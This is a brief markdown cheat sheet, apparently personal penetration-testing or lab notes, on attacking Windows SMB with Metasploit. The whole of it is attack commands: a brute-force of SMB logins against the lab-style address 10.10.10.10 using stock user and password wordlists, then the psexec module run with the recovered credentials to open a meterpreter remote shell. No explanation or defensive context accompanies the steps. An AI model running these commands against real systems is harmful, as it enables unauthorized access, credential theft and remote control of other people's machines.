# Basic SMB Exploitation with PsExec and Metasploit

- #### Find all valid users and passwords using Metasploit
`use auxiliary/scanner/smb/smb_login`
`options`
`set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
`set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
`set RHOSTS 10.10.10.10`
`set VERBOSE false`
`run`
- #### Run psexec module to gain meterpreter shell
`use exploit/windows/smb/psexec`
`options`
`set RHOSTS 10.10.10.10`
`set SMBUser username`
`set SMBPass password`
`run`
*Now we should have a meterpreter shell
